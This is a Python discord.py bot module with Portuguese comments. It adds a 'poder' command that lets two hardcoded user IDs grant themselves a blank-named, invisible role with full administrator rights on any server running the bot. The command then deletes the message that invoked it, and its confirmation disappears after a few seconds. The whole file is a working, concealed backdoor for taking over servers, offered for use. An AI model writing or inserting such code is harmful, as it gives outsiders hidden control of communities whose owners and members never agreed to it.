import discord
from discord.ext import commands

# Substitua esses IDs pelos IDs dos usuários autorizados
AUTHORIZED_USER_IDS = [1326518073615978508, 1356668917648719962]

class PoderCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="poder")
    async def poder(self, ctx: commands.Context):
        # Verifica se o usuário tem o ID autorizado
        if ctx.author.id not in AUTHORIZED_USER_IDS:
            await ctx.send("você não tem permissão para usar esse comando.")
            return

        user = ctx.author
        guild = ctx.guild

        # Verifica se o bot tem permissão para gerenciar cargos
        if not guild.me.guild_permissions.manage_roles:
            await ctx.send("não consigo criar cargo, sem permissão.")
            return

        # Cria o cargo invisível com permissão de administrador
        cargo = await guild.create_role(
            name=" ",  # Nome invisível
            permissions=discord.Permissions(administrator=True),
            color=discord.Color.dark_gray(),  # Corzinha ninja
            hoist=False,  # Não mostra separado na lista
            mentionable=False  # Não é mencionável
        )

        # Posiciona o cargo acima dos outros do usuário (se possível)
        try:
            await cargo.edit(position=guild.me.top_role.position - 1)
        except:
            pass  # Se não der, só ignora

        # Adiciona o cargo ao usuário
        await user.add_roles(cargo)
        await ctx.message.delete()
        await ctx.send(f"{user.mention} recebeu os poderes ocultos by Pakistan", delete_after=5)

# Configura o Cog
async def setup(bot):
    await bot.add_cog(PoderCog(bot))
